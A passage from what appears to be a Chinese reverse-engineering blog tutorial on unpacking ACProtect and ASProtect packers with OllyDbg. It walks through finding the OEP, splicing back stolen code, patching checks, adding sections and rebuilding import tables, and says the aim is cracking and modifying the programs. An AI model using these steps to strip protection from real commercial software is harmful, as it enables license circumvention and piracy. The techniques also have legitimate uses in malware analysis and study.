href="#4-12-4-2-Delphi" class="headerlink" title="4.12.4.2 Delphi"></a>4.12.4.2 Delphi</h4><p>这次的壳发现取消勾选“非内存访问”或“INT3”或两个都取消，都直接跑飞。换方法。</p><p>在命令窗口输入<code>bp GetCurrentProcessId</code>回车，运行，取消断点。用LoadPE查看程序的PID为<code>8C8</code>(每次都会变)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7C8099C0 &gt;  64:A1 18000000  mov eax,dword ptr fs:[0x18]</span><br><span class="line">7C8099C6    8B40 20         mov eax,dword ptr ds:[eax+0x20]          ; comctl_1.&lt;ModuleEntryPoint&gt;</span><br><span class="line">7C8099C9    C3              retn</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">7C8099C0 &gt;  B8 64050000     mov eax,0x564</span><br><span class="line">7C8099C5    90              nop</span><br><span class="line">7C8099C6    90              nop</span><br><span class="line">7C8099C7    90              nop</span><br><span class="line">7C8099C8    90              nop</span><br><span class="line">7C8099C9    C3              retn</span><br></pre></td></tr></table></figure><p>光标处修改为PID，下面指令都nop掉。</p><p>在命令窗口输入<code>bp GetModuleHandleA</code>回车，运行，取消断点。去到<code>M</code>模块，在CODE设置访问中断(F2)，F9运行，出现NAG窗口，点确定后，来到OEP。</p><h3 id="4-12-5-另类方法解ACProtect"><a href="#4-12-5-另类方法解ACProtect" class="headerlink" title="4.12.5 另类方法解ACProtect"></a>4.12.5 另类方法解ACProtect</h3><p>ACProtect 1.4x</p><p>取消勾选“非法内存访问”和“int3中断”都跑飞。用4.12.4.2方法找到“OEP”。用4.12.2寻找Stolen Code跟踪时间太过漫长，可以用另一种办法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040A54C    50              push eax                                 ; 跑跑排行.00400000</span><br><span class="line">0040A54D    E8 1B030000     call 跑跑排行.0040A86D</span><br><span class="line">0040A552    8945 98         mov dword ptr ss:[ebp-0x68],eax          ; 跑跑排行.00400000</span><br></pre></td></tr></table></figure><p>重载，看到有<code>pushad</code>，试一下用ESP定律，硬件断点先别删除，再用最后一次异常法。Shift+F9连续13次到达最佳脱壳地点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00441E4D    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">00441E53    8905 39CA4200   mov dword ptr ds:[0x42CA39],eax</span><br><span class="line">00441E59    FF35 39CA4200   push dword ptr ds:[0x42CA39]</span><br></pre></td></tr></table></figure><p>但是脱壳却说这个位置没有函数。在importREC先填写OEP为<code>A54C</code>，获取输入表修复IAT后，再将OEP改为<code>41E4D</code>，转储到文件。</p><p>程序正常运行，查壳说还有壳，但已经可以进行破解美化DIY了。</p><h3 id="4-12-6-补区段"><a href="#4-12-6-补区段" class="headerlink" title="4.12.6 补区段"></a>4.12.6 补区段</h3><p>ACProtect壳会对<code>MessageBoxA</code>和<code>ReigisterHotKey</code>进行处理，所以我们要在它进行处理的地方nop掉不让它处理。</p><p>将所有忽略异常勾选，在<code>M</code>模块的<code>.rdata</code>处下断运行(没有<code>.rdata</code>用<code>.idata</code>)。单步跟踪看注释窗口出现这两个API函数，把它下面的跳转指令nop掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0043396D    3B85 9CE24100   cmp eax,dword ptr ss:[ebp+0x41E29C]      ; user32.MessageBoxA</span><br><span class="line">00433973    74 20           je short NgaMy.00433995;nop</span><br><span class="line">00433975    90              nop</span><br><span class="line">00433976    90              nop</span><br><span class="line">00433977    90              nop</span><br><span class="line">00433978    90              nop</span><br><span class="line">00433979    3B85 9D014100   cmp eax,dword ptr ss:[ebp+0x41019D]      ; user32.RegisterHotKey</span><br><span class="line">0043397F    74 09           je short NgaMy.0043398A;nop</span><br></pre></td></tr></table></figure><p>再继续往下有magic跳，改JMP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004339C0    80BD D2594100 0&gt;cmp byte ptr ss:[ebp+0x4159D2],0x0</span><br><span class="line">004339C7    74 57           je short NgaMy.00433A20;jmp</span><br></pre></td></tr></table></figure><p>在<code>M</code>模块的<code>.text</code>下访问中断，Shift+F9运行到此处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">00403D38    68 8C3D4000     push NgaMy.00403D8C</span><br><span class="line">00403D3D    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">00403D43    50              push eax</span><br><span class="line">00403D44    8B4424 10       mov eax,dword ptr ss:[esp+0x10]</span><br><span class="line">00403D48    896C24 10       mov dword ptr ss:[esp+0x10],ebp</span><br><span class="line">00403D4C    8D6C24 10       lea ebp,dword ptr ss:[esp+0x10]</span><br><span class="line">00403D50    2BE0            sub esp,eax</span><br><span class="line">00403D52    53              push ebx</span><br><span class="line">00403D53    56              push esi</span><br><span class="line">00403D54    57              push edi</span><br><span class="line">00403D55    8B45 F8         mov eax,dword ptr ss:[ebp-0x8]           ; kernel32.7C817080</span><br><span class="line">00403D58    8965 E8         mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">00403D5B    50              push eax</span><br><span class="line">00403D5C    8B45 FC         mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">00403D5F    C745 FC FFFFFFF&gt;mov dword ptr ss:[ebp-0x4],-0x1</span><br><span class="line">00403D66    8945 F8         mov dword ptr ss:[ebp-0x8],eax</span><br><span class="line">00403D69    8D45 F0         lea eax,dword ptr ss:[ebp-0x10]</span><br><span class="line">00403D6C    64:A3 00000000  mov dword ptr fs:[0],eax</span><br><span class="line">00403D72    C3              retn</span><br></pre></td></tr></table></figure><p>F4去到<code>retn</code>处，F8返回父函数。再去到<code>M</code>模块<code>.text</code>设置内存访问断点运行，F4去到<code>retn</code>处，F8返回父函数。再去到<code>M</code>模块<code>.text</code>设置内存访问断点运行，F4去到<code>retn</code>处，F8返回父函数。到达“OEP”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0040305C    83F9 02         cmp ecx,0x2</span><br><span class="line">0040305F    74 0C           je short NgaMy.0040306D</span><br><span class="line">00403061    81CE 00800000   or esi,0x8000</span><br><span class="line">00403067    8935 B0DE4000   mov dword ptr ds:[0x40DEB0],esi</span><br></pre></td></tr></table></figure><p>用Scylla脱壳(因为用PEtools和LoadPE脱都显示错误)，在importREC输入偏移地址，自动获取输入表没有函数，自己手动查找IAT，起始地址A000，大小174。</p><p>下一步，加壳程序重载，用ESP定律。F9运行5次来到这里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">004365F4    8915 F5FD4100   mov dword ptr ds:[0x41FDF5],edx          ; ntdll.KiFastSystemCallRet</span><br><span class="line">004365FA    FF35 F5FD4100   push dword ptr ds:[0x41FDF5]</span><br><span class="line">00436600    8F05 2DFE4100   pop dword ptr ds:[0x41FE2D]              ; kernel32.7C817077</span><br><span class="line">00436606    FF35 2DFE4100   push dword ptr ds:[0x41FE2D]</span><br><span class="line">0043660C    C70424 60000000 mov dword ptr ss:[esp],0x60</span><br><span class="line">00436613    56              push esi</span><br><span class="line">00436614    890C24          mov dword ptr ss:[esp],ecx</span><br><span class="line">00436617    68 8DFD4100     push NgaMy.0041FD8D</span><br><span class="line">0043661C    59              pop ecx                                  ; kernel32.7C817077</span><br><span class="line">0043661D    8919            mov dword ptr ds:[ecx],ebx</span><br><span class="line">0043661F    8B0C24          mov ecx,dword ptr ss:[esp]               ; kernel32.7C817077</span><br><span class="line">00436622    8F05 ADFE4100   pop dword ptr ds:[0x41FEAD]              ; kernel32.7C817077</span><br><span class="line">00436628    FF35 8DFD4100   push dword ptr ds:[0x41FD8D]</span><br><span class="line">0043662E    C70424 48A24000 mov dword ptr ss:[esp],NgaMy.0040A248</span><br><span class="line">00436635    8905 B9FD4100   mov dword ptr ds:[0x41FDB9],eax</span><br><span class="line">0043663B    FF35 B9FD4100   push dword ptr ds:[0x41FDB9]</span><br><span class="line">00436641    90              nop</span><br><span class="line">00436642    90              nop</span><br><span class="line">00436643    60              pushad</span><br><span class="line">00436644    E8 01000000     call NgaMy.0043664A</span><br></pre></td></tr></table></figure><p>将<code>pushad</code>前的代码二进制复制下来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">89 15 F5 FD 41 00 FF 35 F5 FD 41 00 8F 05 2D FE 41 00 FF 35 2D FE 41 00 C7 04 24 60 00 00 00 56</span><br><span class="line">89 0C 24 68 8D FD 41 00 59 89 19 8B 0C 24 8F 05 AD FE 41 00 FF 35 8D FD 41 00 C7 04 24 48 A2 40</span><br><span class="line">00 89 05 B9 FD 41 00 FF 35 B9 FD 41 00</span><br></pre></td></tr></table></figure><p>取消硬件断点，F4去到<code>pushad</code>的下一条指令，在寄存器窗口找ESP，继续用ESP定律。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">00436F16    68 1DFD4100     push NgaMy.0041FD1D</span><br><span class="line">00436F1B    58              pop eax</span><br><span class="line">00436F1C    8930            mov dword ptr ds:[eax],esi               ; NgaMy.00403D38</span><br><span class="line">00436F1E    8F05 79FC4100   pop dword ptr ds:[0x41FC79]</span><br><span class="line">00436F24    8B05 79FC4100   mov eax,dword ptr ds:[0x41FC79]</span><br><span class="line">00436F2A    FF35 1DFD4100   push dword ptr ds:[0x41FD1D]</span><br><span class="line">00436F30    56              push esi                                 ; NgaMy.00403D38</span><br><span class="line">00436F31    891C24          mov dword ptr ss:[esp],ebx</span><br><span class="line">00436F34    C70424 383D4000 mov dword ptr ss:[esp],NgaMy.00403D38</span><br><span class="line">00436F3B    8B3424          mov esi,dword ptr ss:[esp]</span><br><span class="line">00436F3E    8F05 A5FE4100   pop dword ptr ds:[0x41FEA5]              ; NgaMy.00403D38</span><br><span class="line">00436F44    8905 01FF4100   mov dword ptr ds:[0x41FF01],eax</span><br><span class="line">00436F4A    FF35 01FF4100   push dword ptr ds:[0x41FF01]</span><br><span class="line">00436F50    891C24          mov dword ptr ss:[esp],ebx</span><br><span class="line">00436F53    56              push esi                                 ; NgaMy.00403D38</span><br><span class="line">00436F54    C70424 45FE4100 mov dword ptr ss:[esp],NgaMy.0041FE45</span><br><span class="line">00436F5B    8F05 31FE4100   pop dword ptr ds:[0x41FE31]              ; NgaMy.0041FE45</span><br><span class="line">00436F61    90              nop</span><br><span class="line">00436F62    90              nop</span><br><span class="line">00436F63    60              pushad</span><br><span class="line">00436F64    E8 01000000     call NgaMy.00436F6A</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">68 1D FD 41 00 58 89 30 8F 05 79 FC 41 00 8B 05 79 FC 41 00 FF 35 1D FD 41 00 56 89 1C 24 C7 04</span><br><span class="line">24 38 3D 40 00 8B 34 24 8F 05 A5 FE 41 00 89 05 01 FF 41 00 FF 35 01 FF 41 00 89 1C 24 56 C7 04</span><br><span class="line">24 45 FE 41 00 8F 05 31 FE 41 00</span><br></pre></td></tr></table></figure><p>重复操作n次，到达OEP。</p><p>ESP有：12FFA4、12FF98、12FF94、12FF24、12FF1C、12FF20、12FF1C、12FF1C、12FE8C、12FE8C、12FE90。</p><p>在12FE90处下断点后运行到达jmp指令，F8去到一个大跳转，跳到“OEP”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0043BE77   /EB 01               jmp short NgaMy.0043BE7A  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0043BE7A  - FF25 BCBE4300   jmp dword ptr ds:[0x43BEBC]              ; NgaMy.0040305C</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040305C    83F9 02         cmp ecx,0x2</span><br><span class="line">0040305F    74 0C           je short NgaMy.0040306D</span><br></pre></td></tr></table></figure><p>二进制代码汇总：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">89 15 F5 FD 41 00 FF 35 F5 FD 41 00 8F 05 2D FE 41 00 FF 35 2D FE 41 00 C7 04 24 60 00 00 00 56</span><br><span class="line">89 0C 24 68 8D FD 41 00 59 89 19 8B 0C 24 8F 05 AD FE 41 00 FF 35 8D FD 41 00 C7 04 24 48 A2 40</span><br><span class="line">00 89 05 B9 FD 41 00 FF 35 B9 FD 41 00 68 1D FD 41 00 58 89 30 8F 05 79 FC 41 00 8B 05 79 FC 41 </span><br><span class="line">00 FF 35 1D FD 41 00 56 89 1C 24 C7 04 24 38 3D 40 00 8B 34 24 8F 05 A5 FE 41 00 89 05 01 FF 41 </span><br><span class="line">00 FF 35 01 FF 41 00 89 1C 24 56 C7 04 24 45 FE 41 00 8F 05 31 FE 41 00 8B 1D 31 FE 41 00 89 33 </span><br><span class="line">8F 05 39 FC 41 00 FF 35 39 FC 41 00 5B 8F 05 09 FE 41 00 89 1D 21 FC 41 00 FF 35 21 FC 41 00 C7 </span><br><span class="line">05 19 FC 41 00 09 FE 41 00 8B 1D 19 FC 41 00 8B 33 8F 05 FD FB 41 00 8B 1D FD FB 41 00 FF 15 45 </span><br><span class="line">FE 41 00 89 0D B1 FD 41 00 FF 35 B1 FD 41 00 8F 05 B5 FC 41 00 FF 35 B5 FC 41 00 56 BE FD FC 41 </span><br><span class="line">00 89 3E 5E FF 35 FD FC 41 00 68 94 00 00 00 8F 05 E5 FC 41 00 FF 35 E5 FC 41 00 5F 89 3D 3D FE </span><br><span class="line">41 00 FF 35 3D FE 41 00 8B 0C 24 8F 05 7D FE 41 00 8B 3C 24 8F 05 79 FD 41 00 89 35 25 FC 41 00 </span><br><span class="line">FF 35 25 FC 41 00 89 0C 24 8B 3C 24 8F 05 B9 FC 41 00 8F 05 19 FE 41 00 89 05 89 FD 41 00 FF 35 </span><br><span class="line">89 FD 41 00 57 BF 19 FE 41 00 8B C7 5F 8B 08 8F 05 95 FC 41 00 8B 05 95 FC 41 00 53 8F 05 5D FE </span><br><span class="line">41 00 FF 35 5D FE 41 00 89 0C 24 89 3D 91 FE 41 00 FF 35 91 FE 41 00 8F 05 81 FC 41 00 89 1D 89 </span><br><span class="line">FE 41 00 FF 35 89 FE 41 00 68 81 FC 41 00 5B 8B 0B 8F 05 C9 FC 41 00 8B 1D C9 FC 41 00 57 89 04 </span><br><span class="line">24 89 0C 24 8B 04 24 8F 05 D5 FD 41 00 8B 0C 24 8F 05 4D FC 41 00 50 89 14 24 8F 05 BD FE 41 00 </span><br><span class="line">FF 35 BD FE 41 00 51 B9 DD FD 41 00 89 39 59 FF 35 DD FD 41 00 C7 05 A9 FE 41 00 60 55 40 00 FF </span><br><span class="line">35 A9 FE 41 00 8B 3C 24 8F 05 95 FD 41 00 89 1D 29 FD 41 00 FF 35 29 FD 41 00 8B DF 8B D3 5B 8F </span><br><span class="line">05 E9 FE 41 00 8B 3D E9 FE 41 00 52 89 1C 24 68 9D FE 41 00 5B 89 13 8B 1C 24 8F 05 49 FE 41 00 </span><br><span class="line">8B 14 24 8F 05 69 FD 41 00 FF 15 9D FE 41 00 89 65 E8 89 25 C5 FD 41 00 89 1D 21 FD 41 00 FF 35 </span><br><span class="line">21 FD 41 00 68 C5 FD 41 00 5B 8B 33 8B 1C 24 8F 05 A9 FC 41 00 89 3E 57 8F 05 F5 FE 41 00 FF 35 </span><br><span class="line">F5 FE 41 00 89 34 24 FF 15 BC A0 40 00 8B 4E 10 50 B8 F9 FB 41 00 89 10 58 FF 35 F9 FB 41 00 56 </span><br><span class="line">C7 04 24 AC DE 40 00 8B 14 24 8F 05 AD FD 41 00 89 0A 8F 05 29 FE 41 00 FF 35 29 FE 41 00 5A 8B </span><br><span class="line">46 04 A3 B8 DE 40 00 8B 56 08 52 8F 05 3D FD 41 00 FF 35 3D FD 41 00 8F 05 BC DE 40 00 8B 76 0C </span><br><span class="line">81 E6 FF 7F 00 00 53 BB 35 FE 41 00 89 33 5B FF 35 35 FE 41 00 8F 05 B0 DE 40 00</span><br></pre></td></tr></table></figure><p>用topo工具在脱壳修复后的程序申请一个新的区段，数以上字节数或直接输入1000，记下起始的地址：0043E000。OD打开脱完壳后的程序，找到0043E000，粘贴入代码，记住，后面得加跳向假OEP的代码！！保存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JMP 0040305C </span><br></pre></td></tr></table></figure><p>用LoadPE修正入口点为3E000。</p><h3 id="4-12-7-AC脱壳出现的问题"><a href="#4-12-7-AC脱壳出现的问题" class="headerlink" title="4.12.7 AC脱壳出现的问题"></a>4.12.7 AC脱壳出现的问题</h3><ol><li><strong>用LoadPE无法抓取进程内存</strong>。用Scylla填入OEP，获取输入表，不用管无效函数，转储到文件。再用importREC或Scylla重建IAT。</li><li><strong>用importREC填入OEP无法获取输入表</strong>。用Scylla重建IAT，但剪切指针时可能麻烦一点。</li></ol><h2 id="4-13-ASProtect"><a href="#4-13-ASProtect" class="headerlink" title="4.13 ASProtect"></a>4.13 ASProtect</h2><h3 id="4-13-1-ASProtect-1-2"><a href="#4-13-1-ASProtect-1-2" class="headerlink" title="4.13.1 ASProtect 1.2"></a>4.13.1 ASProtect 1.2</h3><p>选项-&gt;调试设置-&gt;异常，将所有异常取消勾选。用最后一次异常法，Shift+F9运行19次。在<code>retn</code>处F2-&gt;Shift+F9-&gt;F2。去到<code>M</code>模块，在401000处下断运行，直接去到OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0040A41E    55              push ebp</span><br><span class="line">0040A41F    8BEC            mov ebp,esp</span><br><span class="line">0040A421    6A FF           push -0x1</span><br><span class="line">0040A423    68 C8CB4000     push 跑跑赛道.0040CBC8</span><br><span class="line">0040A428    68 A4A54000     push 跑跑赛道.0040A5A4</span><br></pre></td></tr></table></figure><h3 id="4-13-2-ASProtect-1-23-RC1"><a href="#4-13-2-ASProtect-1-23-RC1" class="headerlink" title="4.13.2 ASProtect 1.23 RC1"></a>4.13.2 ASProtect 1.23 RC1</h3><p>取消勾选“非法内存访问”，最后一次异常法。Shift+F9运行16次。用4.13.1的方法找到OEP。</p><p>也可以用另一种方法。运行到<code>retn</code>后，查看堆栈窗口的<code>400000</code>下的第二行的数值<code>12FFA4</code>。在命令窗口下硬件断点<code>hr 12FFA4</code>，运行，F8经过一个大跳转也可去到OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0012FF5C   00A0381C</span><br><span class="line">0012FF60   00400000  跑跑排行.00400000</span><br><span class="line">0012FF64   3D375BA5</span><br><span class="line">0012FF68   0012FFA4</span><br></pre></td></tr></table></figure><p>脱壳正常运行。</p><p>也可以用asprdbgr脱壳辅助工具打开加壳程序，让它自动修复IAT，打开importREC发现只有3个无效指针了，直接剪切掉。同样可以运行。</p><h3 id="4-13-3-ASProtect-1-23-RC4"><a href="#4-13-3-ASProtect-1-23-RC4" class="headerlink" title="4.13.3 ASProtect 1.23 RC4"></a>4.13.3 ASProtect 1.23 RC4</h3><p>判断ASProtect版本：</p><ol><li>ASProtect 1.23 RC4 按shift+f9键26次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到fake oep。</li></ol><ol><li><p>ASProtect 1.31 04.27 按shift+f9键36次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到foep。</p></li><li><p>ASProtect 1.31 05.18 按shift+f9键40次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到foep。</p></li><li><p>ASProtect 1.31 06.14 按shift+f9键38次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到foep。</p></li></ol><p>用最后一次异常法可能判断不准确，也可以用PEID的VerA插件区分版本。</p><img src="/posts/e2d652c5/ASProtect123rc4.jpg" class="" title="ASProtect123rc4"><p>[1]表示上述第一个版本RC4。</p><p>取消勾选“非法访问内存”，Shift+F9运行26次，在<code>retn</code>处F2-&gt;Shift+F9-&gt;F2。去到<code>M</code>模块，在401000处下断运行，直接去到FOEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004F27CF    FF15 9CC25200   call dword ptr ds:[0x52C29C]</span><br><span class="line">004F27D5    33D2            xor edx,edx                              ; ntdll.KiFastSystemCallRet</span><br><span class="line">004F27D7    8AD4            mov dl,ah</span><br><span class="line">004F27D9    8915 34306900   mov dword ptr ds:[0x693034],edx          ; ntdll.KiFastSystemCallRet</span><br></pre></td></tr></table></figure><p>找回被偷代码，取消勾选“非法访问内存”，Shift+F9运行26次，在<code>retn</code>处F2-&gt;Shift+F9-&gt;F2。查看堆栈窗口的<code>400000</code>往下数第二行数值为<code>12FFA4</code>，在命令窗口输入<code>hr 12FFA4</code>下硬件断点，运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0012FF5C   00C86804</span><br><span class="line">0012FF60   00400000  SoWorker.00400000</span><br><span class="line">0012FF64   E3DE7228</span><br><span class="line">0012FF68   0012FFA4</span><br></pre></td></tr></table></figure><p>一路F8跟到以下，call跟进去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00C8544B    BD 5154C800     mov ebp,0xC85451</span><br><span class="line">00C85450    FF55 03         call dword ptr ss:[ebp+0x3]</span><br></pre></td></tr></table></figure><p>发现类似于OEP开头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00C8547A    55              push ebp</span><br><span class="line">00C8547B    8BEC            mov ebp,esp</span><br><span class="line">00C8547D    6A FF           push -0x1</span><br><span class="line">00C8547F    68 78E35300     push 0x53E378</span><br><span class="line">00C85484    68 407B4F00     push 0x4F7B40</span><br><span class="line">00C85489    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">00C8548F   /EB 01           jmp short 00C85492</span><br></pre></td></tr></table></figure><p>将jmp以上(不包含jmp)的代码二进制复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">55 8B EC 6A FF 68 78 E3 53 00 68 40 7B 4F 00 64 A1 00 00 00 00</span><br></pre></td></tr></table></figure><p>执行jmp到以下代码，再复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00C85492    50              push eax</span><br><span class="line">00C85493    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">00C8549A    83EC 58         sub esp,0x58</span><br><span class="line">00C8549D    EB 01           jmp short 00C854A0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">50 64 89 25 00 00 00 00 83 EC 58</span><br></pre></td></tr></table></figure><p>以此类推</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00C854A0    53              push ebx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00C854A4    56              push esi</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">56</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00C854A8    57              push edi                                 ; SoWorker.006CF040</span><br><span class="line">00C854A9    8965 E8         mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">00C854AC    26:eb 01        jmp short 00c854b0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">57 89 65 E8</span><br></pre></td></tr></table></figure><p>汇总一下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">55 8B EC 6A FF 68 78 E3 53 00 68 40 7B 4F 00 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 58 53 56 57 89 65 E8</span><br></pre></td></tr></table></figure><p>一路F7到这里，再一路F8去到<code>retn</code>，返回父函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00C85378    51              push ecx</span><br><span class="line">00C85379    57              push edi                                 ; SoWorker.006CF040</span><br><span class="line">00C8537A    9C              pushfd</span><br><span class="line">00C8537B    FC              cld</span><br><span class="line">00C8537C    BF B953C800     mov edi,0xC853B9</span><br><span class="line">00C85381    B9 5E140000     mov ecx,0x145E</span><br><span class="line">00C85386    F3:AA           rep stos byte ptr es:[edi]</span><br><span class="line">00C85388    9D              popfd</span><br><span class="line">00C85389    5F              pop edi                                  ; SoWorker.004F27CF</span><br><span class="line">00C8538A    59              pop ecx                                  ; SoWorker.004F27CF</span><br><span class="line">00C8538B    C3              retn</span><br></pre></td></tr></table></figure><p>直接来到FOEP，上面全为0是因为真正的OEP被移到了别处，刚才所做的操作就是把OEP拼接起来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004F27C9    0000            add byte ptr ds:[eax],al</span><br><span class="line">004F27CB    0000            add byte ptr ds:[eax],al</span><br><span class="line">004F27CD    0000            add byte ptr ds:[eax],al</span><br><span 